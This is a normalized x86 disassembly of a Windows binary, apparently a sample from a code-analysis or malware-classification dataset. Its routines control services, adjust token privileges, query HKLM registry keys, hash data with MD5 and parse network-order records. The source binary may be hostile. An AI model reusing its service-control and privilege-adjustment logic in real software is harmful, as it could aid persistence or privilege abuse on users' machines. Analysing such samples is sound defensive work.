cmp [ ebp - 0x18 ] 0x1
je r-xdata
push 0x5
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x4e20
jmp r-xdata
push 0x10
push r--data
mov eax [ ebp - 0x8 ]
push eax
call [ OpenServiceW@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax 0x4269
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x1388
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp - 0x8 ]
push ecx
call [ CloseServiceHandle@IAT ]
mov eax 0x426a
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0x8 ]
push ecx
call [ CloseServiceHandle@IAT ]
mov eax [ ebp - 0x14 ]
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
call [ StartServiceW@IAT ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x14 ] eax
push 0x64
call [ Sleep@IAT ]
mov edx [ ebp - 0x4 ]
add edx 0x64
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1388
jae r-xdata
sub_409200
push ebp
mov ebp esp
sub esp 0x14
push esi
mov eax [ ebp + 0x8 ]
add eax 0x2
xor ecx ecx
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_412ddb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov [ ecx ] r--data
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] r--data
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp + 0x8 ]
jge r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
add eax 0x2
push eax
call sub_409110
add esp 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
push edx
call sub_41226d
add esp 0x4
mov eax [ ebp - 0x4 ]
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
mov ecx [ esi + ecx * 4 ]
mov [ eax + edx * 4 + 0x8 ] ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
sub_4092b0
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
push eax
call sub_411794
add esp 0x4
mov esi eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_411794
add esp 0x4
add esi eax
cmp esi 0x104
jb r-xdata
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ PathAppendW@IAT ]
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_4092f0
push ebp
mov ebp esp
sub esp 0x22c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x220 ] ax
push 0x208
push 0x0
lea ecx [ ebp - 0x21e ]
push ecx
call sub_412f80
add esp 0xc
push 0x104
mov edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x220 ]
push eax
call sub_4134a9
add esp 0xc
push r--data
lea ecx [ ebp - 0x220 ]
push ecx
call sub_4092b0
add esp 0x8
test eax eax
jne r-xdata
mov edx [ r--data ]
mov [ ebp - 0x10 ] edx
mov eax [ r--data ]
mov [ ebp - 0xc ] eax
push 0x0
push 0x0
push 0x2
push 0x0
push 0x0
push 0x40000000
lea ecx [ ebp - 0x220 ]
push ecx
call [ CreateFileW@IAT ]
mov [ ebp - 0x228 ] eax
cmp [ ebp - 0x228 ] 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
push 0x0
lea edx [ ebp - 0x224 ]
push edx
push 0x7
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x228 ]
push ecx
call [ WriteFile@IAT ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x228 ]
push edx
call [ CloseHandle@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
mov [ ebp - 0x22c ] 0x0
cmp [ ebp - 0x224 ] 0x7
jne r-xdata
mov [ ebp - 0x22c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x22c ]
sub_409400
push ebp
mov ebp esp
sub esp 0x50
mov [ ebp - 0x10 ] 0xcf
push 0x5
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x4
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
call [ OpenServiceW@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x48 ] eax
cmp [ ebp - 0x48 ] 0x5
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x30 ] edx
call [ GetLastError@IAT ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x8 ]
push eax
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0x3c ]
mov [ ebp - 0x4c ] ecx
cmp [ ebp - 0x4c ] 0x7b
ja r-xdata
mov eax 0xfd
jmp r-xdata
cmp [ ebp - 0x48 ] 0x429
je r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
push edx
call [ CloseServiceHandle@IAT ]
mov eax [ ebp - 0x8 ]
push eax
call [ CloseServiceHandle@IAT ]
mov eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x40 ]
push ecx
push 0x24
lea edx [ ebp - 0x34 ]
push edx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call [ QueryServiceStatusEx@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x4c ] 0x424
je r-xdata
cmp [ ebp - 0x4c ] 0x7b
je r-xdata
mov esp ebp
pop ebp
retn
mov eax 0xfe
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x30 ] 0x1
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x44 ] eax
mov ecx [ ebp - 0x44 ]
mov [ ebp - 0x50 ] ecx
cmp [ ebp - 0x50 ] 0x7c
ja r-xdata
mov eax 0xee
jmp r-xdata
jmp r-xdata
mov eax 0xed
jmp r-xdata
cmp [ ebp - 0x4c ] 0x5
je r-xdata
mov eax 0xff
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x32
mov [ ebp - 0x4 ] eax
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x50 ]
sub edx 0x41c
mov [ ebp - 0x50 ] edx
cmp [ ebp - 0x50 ] 0x3f
ja r-xdata
cmp [ ebp - 0x50 ] 0x7c
je r-xdata
mov eax 0xef
jmp r-xdata
mov eax 0xeb
jmp r-xdata
cmp [ ebp - 0x4c ] 0x6
je r-xdata
mov eax [ ebp + 0xc ]
imul eax eax 0x3e8
cmp [ ebp - 0x4 ] eax
jae r-xdata
mov [ ebp - 0x30 ] 0xdf
mov eax [ ebp - 0x50 ]
movzx ecx [ eax + lookup_table_4096b4 ]
jmp [ ecx * 4 + jump_table_4096a8 ]
mov [ ebp - 0x30 ] 0xdd
jmp r-xdata
mov edx [ ebp - 0x50 ]
sub edx 0x5
mov [ ebp - 0x50 ] edx
cmp [ ebp - 0x50 ] 0x75
ja r-xdata
mov eax 0xec
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x30 ] 0xde
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x32
mov [ ebp - 0x4 ] edx
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x50 ]
movzx ecx [ eax + lookup_table_409630 ]
jmp [ ecx * 4 + jump_table_40961c ]
mov [ ebp - 0x30 ] 0xd9
jmp r-xdata
mov [ ebp - 0x30 ] 0xda
jmp r-xdata
mov [ ebp - 0x30 ] 0xdb
jmp r-xdata
mov [ ebp - 0x30 ] 0xdc
jmp r-xdata
sub_4096b7
add al [ edx ]
add al [ edx ]
add al [ edx ]
add [ eax ] al
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add esp ecx
int3
sub_409700
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push 0x20119
push 0x0
push r--data
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call [ RegCloseKey@IAT ]
mov eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_409740
push ebp
mov ebp esp
sub esp 0x218
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x218 ] ax
push 0x208
push 0x0
lea ecx [ ebp - 0x216 ]
push ecx
call sub_412f80
add esp 0xc
mov edx [ ebp + 0x8 ]
push edx
call sub_411794
add esp 0x4
cmp eax 0x104
jbe r-xdata
push 0x104
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x218 ]
push ecx
call sub_4134a9
add esp 0xc
lea edx [ ebp - 0x218 ]
push edx
call [ PathStripToRootW@IAT ]
lea eax [ ebp - 0x218 ]
push eax
call [ GetDriveTypeW@IAT ]
xor ecx ecx
cmp eax 0x3
sete cl
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov eax 0x1
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
sub_4097e0
push ebp
mov ebp esp
sub esp 0x28
mov [ ebp - 0x4 ] r--data
lea eax [ ebp - 0x1c ]
push eax
push 0x20019
push 0x0
mov ecx [ ebp - 0x4 ]
push ecx
push 0x80000002
call [ RegOpenKeyExW@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
push edx
push r--data
mov eax [ ebp - 0x1c ]
push eax
call sub_4098e0
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x20 ] 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push r--data
mov edx [ ebp - 0x1c ]
push edx
call sub_4098e0
add esp 0xc
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x24 ] 0x0
lea ecx [ ebp - 0x14 ]
push ecx
push r--data
mov edx [ ebp - 0x1c ]
push edx
call sub_4098e0
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov [ ebp - 0x28 ] 0x0
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ ecx ] edx
mov eax [ ebp - 0x1c ]
push eax
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0xc ]
sub_4098e0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
push 0x0
push 0x0
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ RegQueryValueExW@IAT ]
mov [ ebp - 0x8 ] eax
xor eax eax
cmp [ ebp - 0x8 ] 0x0
sete al
mov esp ebp
pop ebp
retn
sub_409920
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov edx [ ebp - 0x18 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x10 ]
neg ecx
sbb ecx ecx
and ecx 0x2
mov [ ebp - 0x4 ] ecx
push 0x0
call [ SetLastError@IAT ]
push 0x0
push 0x0
push 0x10
lea edx [ ebp - 0x10 ]
push edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call [ AdjustTokenPrivileges@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
neg eax
sbb eax eax
add eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_4099a0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0xf00ff
mov ecx [ ebp - 0xc ]
push ecx
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] edx
call [ GetLastError@IAT ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_409920
add esp 0xc
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
push eax
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
push eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
sub_409ac0
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x8 ]
push eax
call sub_411794
add esp 0x4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
movzx eax [ edx + ecx * 2 - 0x2 ]
cmp eax 0x5c
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
movzx eax [ edx + ecx * 2 - 0x2 ]
cmp eax 0x2f
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
push eax
call sub_41226d
add esp 0x4
mov [ ebp - 0x4 ] r--data
push 0x104
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_4134a9
add esp 0xc
mov eax [ ebp - 0x4 ]
push eax
call sub_411794
add esp 0x4
mov ecx [ ebp + 0xc ]
lea edx [ ecx + eax * 2 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
call sub_409c20
add esp 0xc
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x24 ]
push eax
call sub_41226d
add esp 0x4
mov eax 0x1
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x1c ]
push ecx
call sub_41226d
add esp 0x4
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x2
xor ecx ecx
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_412ddb
add esp 0x4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
lea edx [ ecx + ecx + 0x4 ]
push edx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call sub_412f80
add esp 0xc
mov ecx [ ebp - 0x8 ]
add ecx 0x1
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call sub_4134a9
add esp 0xc
mov ecx [ ebp - 0xc ]
push ecx
call sub_416408
add esp 0x4
mov [ ebp - 0x10 ] 0x0
lea edx [ ebp - 0x10 ]
push edx
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x8 ]
shl ecx 0x1
push ecx
mov edx [ ebp - 0xc ]
push edx
call sub_409c80
add esp 0x10
test eax eax
jne r-xdata
sub_409c20
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx ]
jae r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x8 ]
movzx edx [ ecx ]
push edx
push r--data
mov eax [ ebp - 0x4 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
add ecx 0x4
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
sub_409c80
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
push 0x0
push 0x1
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
call [ CryptAcquireContextA@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x8 ]
push edx
push 0x0
push 0x0
push 0x8003
mov eax [ ebp - 0xc ]
push eax
call [ CryptCreateHash@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
je r-xdata
push 0x0
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x8 ]
push eax
call [ CryptHashData@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push 0x8
push 0x1
push 0x0
push 0x0
lea ecx [ ebp - 0xc ]
push ecx
call [ CryptAcquireContextA@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x4
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
push 0x4
mov eax [ ebp - 0x8 ]
push eax
call [ CryptGetHashParam@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
push edx
call sub_412ddb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
push eax
push 0x0
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
push edx
call sub_412f80
add esp 0xc
push 0x0
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
push edx
push 0x2
mov eax [ ebp - 0x8 ]
push eax
call [ CryptGetHashParam@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
call [ CryptDestroyHash@IAT ]
mov eax 0x1
push 0x0
mov edx [ ebp - 0xc ]
push edx
call [ CryptReleaseContext@IAT ]
sub_409dc0
push ebp
mov ebp esp
push ecx
push 0x404
call sub_412584
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
push 0x400
push 0x0
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call sub_412f80
add esp 0xc
mov ecx [ ebp - 0x4 ]
push ecx
call sub_409e30
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_412a1c
add esp 0x4
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
push edx
call sub_40a210
add esp 0x4
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_409e30
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
push 0x1
push 0x4
lea edx [ ebp - 0x4 ]
push edx
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
push 0x4
push rw-data
lea eax [ ebp - 0x4 ]
push eax
call sub_413ec7
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
push 0x1
push 0x4
lea eax [ ebp - 0x14 ]
push eax
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x14 ]
push ecx
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0x14 ] eax
push 0x0
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
call sub_412bff
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
push 0x1
push 0x4
lea ecx [ ebp - 0xc ]
push ecx
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp - 0xc ]
push edx
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
push eax
call sub_412584
add esp 0x4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
push 0x1
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x10 ]
add ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x10 ]
push edx
call sub_4121b5
add esp 0x4
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
call sub_4121b5
add esp 0x4
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x8 ]
neg eax
sbb eax eax
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_409f90
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x8 ]
jae r-xdata
sub_409f90
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
sub ecx [ eax ]
cmp ecx 0xe
jge r-xdata
push 0x4
mov edx [ ebp + 0xc ]
mov eax [ edx ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
call sub_416940
add esp 0xc
mov edx [ ebp + 0xc ]
mov eax [ edx ]
add eax 0x4
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
push 0x4
mov edx [ ebp + 0xc ]
mov eax [ edx ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
call sub_416940
add esp 0xc
mov edx [ ebp + 0xc ]
mov eax [ edx ]
add eax 0x4
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
push 0x4
mov edx [ ebp + 0xc ]
mov eax [ edx ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
call sub_416940
add esp 0xc
mov edx [ ebp + 0xc ]
mov eax [ edx ]
add eax 0x4
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov edx [ ebp - 0x14 ]
push edx
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
push eax
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov [ ebp - 0x10 ] eax
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
cmp eax [ ebp + 0x10 ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp + 0xc ]
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40a0c0
add esp 0x18
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
add ecx 0x1
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
movsx eax [ edx ]
test eax eax
je r-xdata
sub_40a0c0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
add eax 0x14
push eax
call sub_412584
add esp 0x4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ ecx ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x14 ]
mov [ edx + 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x18 ]
mov [ ecx + 0x8 ] edx
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x1c ]
mov [ eax + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx 0x1
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0xc ]
add ecx 0x10
push ecx
call sub_416940
add esp 0xc
mov edx [ ebp + 0xc ]
push edx
call sub_40a180
add esp 0x4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x4 ]
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx + eax * 4 + 0x4 ] edx
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov [ ebp - 0x4 ] edx
jmp r-xdata
xor eax eax
sub_40a180
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
movzx eax [ edx ]
test eax eax
